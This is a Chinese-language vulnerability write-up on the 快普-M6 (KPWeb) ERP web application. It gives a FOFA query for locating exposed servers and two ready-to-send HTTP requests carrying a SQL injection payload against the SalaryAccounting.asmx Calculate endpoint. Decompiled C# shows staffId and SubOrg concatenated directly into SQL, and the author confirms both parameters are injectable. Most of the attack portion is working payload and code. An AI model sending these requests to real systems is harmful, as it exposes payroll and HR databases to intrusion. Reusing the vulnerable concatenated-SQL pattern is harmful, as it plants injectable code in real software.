## 快普

fofa语句 app="快普-M6"

安装完文件夹为KPWeb，目录结构如下

```
├── AdminPasswordRecover.aspx
├── Api
├── App_GlobalResources
├── App_Themes
├── Default.aspx
├── Global.asax
├── Localization
├── Mobile
├── Resource
├── Runtime
├── SiteRegister.aspx
├── UserControl
├── WCFService
├── Web.config
├── WebEnterprise
├── WebService
├── app_offline_hide.htm
├── ascx
├── ashx
├── bin
├── kp1.ico
├── kpweb.config
├── robots.txt
```

web.config如下

```
	<system.web>
		<webServices>
			<protocols>
				<add name="HttpPost"/>
				<add name="HttpGet"/>
			</protocols>
		</webServices>
		<pages validateRequest="false" enableViewStateMac="false" enableEventValidation="false" viewStateEncryptionMode="Never">
			<controls>
				<add tagPrefix="asp" namespace="System.Web.UI" assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
				<add tagPrefix="MST" namespace="KPMIIS.WebControls" assembly="KPMIIS.WebControls"/>
				<add tagPrefix="ajaxToolkit" namespace="AjaxControlToolkit" assembly="AjaxControlToolkit"/>
				<add tagPrefix="kp" namespace="KPMIIS.BussinessControls" assembly="KPMIIS.BussinessControls"/>
				<add tagPrefix="kp" namespace="KPMIIS.Web.UserControl" assembly="KPMIIS.Web"/>
				<add tagPrefix="asp" namespace="System.Web.UI.WebControls" assembly="System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
				<add tagPrefix="CKEditor" assembly="CKEditor.NET" namespace="CKEditor.NET"/>
				<add tagPrefix="pager" namespace="MyPager3" assembly="KPMIIS.WebControls"/>
				<add tagPrefix="kp" src="~/ascx/PopupSelect.ascx" tagName="PopupSelect"/>
				<add tagPrefix="kp" src="~/ascx/HiddenValue.ascx" tagName="HiddenValue"/>
				<add tagPrefix="kp" src="~/UserControl/MainCondition.ascx" tagName="MainCondition"/>
				<add tagPrefix="kp" src="~/UserControl/DevGridView.ascx" tagName="DevGridView"/>
				<add tagPrefix="kp" src="~/UserControl/DetailReportGridView.ascx" tagName="DetailReportGridView"/>
			</controls>
		</pages>

	<SoftwareArchitects>
		<Caching CachingTimeSpan="10">
			<FileExtensions>
				<clear/>
				<add Extension="gif" ContentType="image\gif"/>
				<add Extension="jpg" ContentType="image\jpg"/>
				<add Extension="png" ContentType="image\png"/>
				<add Extension="css" ContentType="text\css"/>
				<add Extension="js" ContentType="application/x-javascript"/>
			</FileExtensions>
		</Caching>
	</SoftwareArchitects>
```

本来想看一下是否有json反序列化,但是发现`TypeNameHandling`为None

默认情况下`TypeNameHandling`为None,表示Json.NET在反序列化期间不读取或写入类型名称。会使传递就去类名无法进行读取和写入，即不可触发漏洞。

网上一共有两个漏洞 MediaUpload.ashx的sql注入和SalaryAccountingsql的sql注入 但是我安装的版本没有MediaUpload.ashx

SalaryAccountingsql注入复现 网上的poc如下

```
POST /WebService/HR/Salary/SalaryAccounting.asmx HTTP/1.1
Host: 
SOAPAction: http://tempuri.org/Calculate
Content-Type: text/xml;charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
        
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
        <soapenv:Header/>
        <soapenv:Body>
          <tem:Calculate>
            <!--type: string-->
            <tem:SalaryCategory></tem:SalaryCategory>
            <!--type: string-->
            <tem:StaffBirthDay></tem:StaffBirthDay>
            <!--type: string-->
            <tem:staffId>
            1) and 1=@@version--+</tem:staffId>
            <!--type: string-->
            <tem:Department></tem:Department>
            <!--type: string-->
            <tem:SubOrg></tem:SubOrg>
            <!--type: string-->
            <tem:taxMonthly></tem:taxMonthly>
          </tem:Calculate>
        </soapenv:Body>
</soapenv:Envelope>
```

也可以写成下面这样

```
POST /WebService/HR/Salary/SalaryAccounting.asmx/Calculate HTTP/1.1
Host: 
Content-Length: 102
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

SalaryCategory=&StaffBirthDay=&staffId=1%29+and+1%3D%40%40version--%2B&Department=&SubOrg=&taxMonthly=
```



去对应文件夹打开SalaryAccounting.asmx

```
├── Attendance
├── Contract
├── Exam
├── HRHelper.asmx
├── Personnel
├── Recruit
├── Salary
└── Training
```

Class=".Web.WebService.HR.Salary.SalaryAccounting"

直接打开对应dll文件

源码如下

```
[ScriptService]
[WebService(Namespace = "http://tempuri.org/")]
public class SalaryAccounting : WebService

	[WebMethod]
	public string Calculate(string SalaryCategory, string StaffBirthDay, string staffId, string Department, string SubOrg, string taxMonthly)
				}
			string message = AccountProcess(SalaryCategory, StaffBirthDay, staffId.TrimEnd(new char[1] { ',' }), strOrganizationCode, SubOrg, taxMonthly);
			sbMessage.Append(message);
		}
		catch (Exception ex)
			protected string AccountProcess(string SalaryCategory, string StaffBirthDay, string staffId, string Department, string SubOrg, string taxMonthly)
	{
		try
		{
			StringBuilder sqlStr = new StringBuilder();
			sqlStr.Append("SELECT HR_SalaryFilesHistory.SFH_STAFF_ID FROM dbo.HR_SalaryFilesHistory  WHERE HR_SalaryFilesHistory.SFH_SA_ID != 0 ");
			if (!string.IsNullOrEmpty(SalaryCategory))
			{
				sqlStr.Append($" AND SCO_CATEGORY_ID={SalaryCategory} ");
			}
			if (!string.IsNullOrEmpty(StaffBirthDay))
			{
				sqlStr.Append(string.Format(" AND YEAR(SFH_SALARY_YEARS)=YEAR('{0}') AND MONTH(SFH_SALARY_YEARS)=MONTH('{0}') ", StaffBirthDay + "-01"));
			}
			if (!string.IsNullOrEmpty(staffId))
			{
				sqlStr.Append($" AND SFH_STAFF_ID IN (SELECT tempString FROM F_SplitNew('{staffId}',','))");
			}
			if (!string.IsNullOrEmpty(Department))
			{
				sqlStr.Append($" AND SFH_STAFF_DEPARTMENT_ID IN (SELECT tempString FROM F_SplitNew('{Department}',',')) ");
			}
			if (!string.IsNullOrEmpty(SubOrg))
			{
				sqlStr.Append($" AND SUB_ORG_ID = {SubOrg} ");
			}
			DataSet ds = Gateway.Default.FromCustomSql(sqlStr.ToString()).ToDataSet();
			StringBuilder staffIdFlow = new StringBuilder();
			if (ds.Tables.Count > 0)
			{
				for (int i = 0; i < ds.Tables[0].Rows.Count; i++)
				{
					if (i == ds.Tables[0].Rows.Count - 1)
					{
						staffIdFlow.Append(ds.Tables[0].Rows[i][0]);
					}
					else
					{
						staffIdFlow.Append(string.Concat(ds.Tables[0].Rows[i][0], ","));
					}
				}
			}
			_bllSalaryFilesHistory.Delete(Convert.ToDateTime(StaffBirthDay), Convert.ToInt32(SalaryCategory), staffId, Department, SubOrg);
			ReshuffledAccounting(SalaryCategory, StaffBirthDay, staffId, Department, SubOrg, staffIdFlow.ToString());
			_bllSalaryFilesHistory.Insert(Convert.ToDateTime(StaffBirthDay), Convert.ToInt32(SalaryCategory), 1, staffId, Department, SubOrg, taxMonthly);
			DataTable dtHistory = _bllHrVSalaryFilesHistoryList.GetDataTable(HR_V_SalaryFilesHistoryList._.SCO_CATEGORY_ID == SalaryCategory && HR_V_SalaryFilesHistoryList._.SFH_SALARY_YEAR == DateTime.Parse(StaffBirthDay).Year && HR_V_SalaryFilesHistoryList._.SFH_SALARY_MONTH == DateTime.Parse(StaffBirthDay).Month);
			StringBuilder sbWhere = new StringBuilder();
			if (!string.IsNullOrEmpty(SalaryCategory))
			{
				sbWhere.Append($" and T1.SCO_CATEGORY_ID = {SalaryCategory}");
			}
			if (!string.IsNullOrEmpty(staffId))
			{
				sbWhere.Append($" and SFH_STAFF_ID in ({staffId})");
			}
			if (!string.IsNullOrEmpty(StaffBirthDay))
			{
				sbWhere.Append(string.Format(" and T1.SFH_SALARY_YEARS = '{0}'", new DateTime(Convert.ToDateTime(StaffBirthDay).Year, Convert.ToDateTime(StaffBirthDay).Month, 1).ToString("yyyy-MM-dd")));
			}
			DataTable dtSalaryHistoryTotalTable = Gateway.Default.FromStoredProcedure("HR_P_SalaryHistoryTotalTable").AddInputParameter("@where", DbType.String, sbWhere.ToString()).ToDataSet()
				.Tables[0];
			WhereClip wcMonthly = new WhereClip() && new WhereClip(" 1 = 1 ", null, null, null);
			string wcMonthDate = "";
			if (!string.IsNullOrEmpty(StaffBirthDay))
			{
				wcMonthly = wcMonthly && new WhereClip($" ham.MONTHLY_DATE = '{StaffBirthDay}' ", null, null, null);
				wcMonthDate = StaffBirthDay;
			}
			if (!string.IsNullOrEmpty(staffId))
			{
				wcMonthly = wcMonthly && new WhereClip($" A.STAFF_ID in ({staffId}) ", null, null, null);
			}
			if (!string.IsNullOrEmpty(Department))
			{
				string strOrganizationCode = "";
				strOrganizationCode = new BLLCOMMON_Organization().GetIDsOrganizations(Department);
				if (strOrganizationCode != "")
				{
					wcMonthly = wcMonthly && new WhereClip(string.Format(" A.ORGANIZATION_ID in ({0}) ", string.IsNullOrEmpty(strOrganizationCode) ? "-1" : strOrganizationCode), null, null, null);
				}
			}
			if (!string.IsNullOrEmpty(SubOrg))
			{
				wcMonthly = wcMonthly && new WhereClip(string.Format(" E.SUB_ORG_ID in ({0}) ", string.IsNullOrEmpty(SubOrg) ? "-1" : SubOrg), null, null, null);
			}
			DataTable dtMonthly = _bllHrAttendanceMonthly.GetTable(wcMonthly, new WhereClip($" FLOW_STATE = {3} ", null, null, null), wcMonthDate);
```

经过测试除了staffId，suborg参数也可以